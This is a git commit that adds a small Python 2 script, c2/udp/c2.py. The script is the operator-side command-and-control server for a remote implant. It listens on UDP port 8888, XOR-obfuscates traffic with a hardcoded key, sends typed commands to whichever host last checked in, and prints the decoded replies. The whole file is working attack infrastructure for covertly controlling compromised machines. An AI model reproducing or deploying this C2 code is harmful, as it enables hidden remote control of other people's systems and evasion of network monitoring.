48325ed0c9af40e4469c9d2dc5cbc09d9946c94b
phillip@ironrain.org <smitty@localhost.localdomain>
2018-12-09 15:09:41 -0500

    -udp c2

---
+++ c2/udp/c2.py
@@ -0,0 +1,35 @@
+#!/usr/bin/python
+
+import fcntl, os, select, socket, sys, time
+from itertools import cycle, izip
+
+UDP_IP = "0.0.0.0"
+UDP_PORT = 8888
+
+key = "blarknob"
+
+def crypt(m):
+    return ''.join(chr(ord(c)^ord(k)) for c, k in izip(m, cycle(key)))
+
+def main():
+    print "Starting..."
+    orig_fl = fcntl.fcntl(sys.stdin, fcntl.F_GETFL)
+    fcntl.fcntl(sys.stdin, fcntl.F_SETFL, orig_fl | os.O_NONBLOCK)
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind((UDP_IP, UDP_PORT))
+
+    addr = None
+
+    while True:
+        if select.select([sys.stdin], [], [], 0.0)[0]:
+            data = sys.stdin.read().strip()
+            if addr:
+                sock.sendto(crypt(data) + '\n', addr)
+        if select.select([sock], [], [], 0.0)[0]:
+            data, addr = sock.recvfrom(65535)
+            print crypt(data).replace("<<CRLCHK>>",""),
+        time.sleep(0.5)
+
+if __name__ == "__main__":
+    main()
